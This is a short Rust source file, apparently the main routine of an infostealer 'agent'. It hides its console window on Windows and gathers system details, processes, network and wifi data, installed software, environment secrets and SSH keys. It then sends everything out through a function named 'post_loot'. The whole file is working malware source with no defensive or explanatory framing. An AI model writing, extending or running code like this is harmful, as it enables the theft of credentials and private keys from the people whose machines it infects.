#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

use agent::{collect, transport};
use serde_json::json;
use sysinfo::System;

fn main() {
    let mut sys = System::new_all();
    sys.refresh_all();

    let home = collect::user::home_dir();
    let payload = json!({
        "timestamp": unix_now(),
        "type": "recon",
        "system": collect::system::collect(&sys),
        "user": collect::user::collect(),
        "processes": collect::system::collect_processes(&sys),
        "interfaces": collect::network::collect(),
        "wifi": collect::wifi::collect(),
        "software": collect::software::collect(),
        "env_secrets": collect::files::env_secrets(),
        "ssh_keys": collect::files::ssh_keys(&home),
    });

    transport::post_loot(&payload);
}

fn unix_now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}
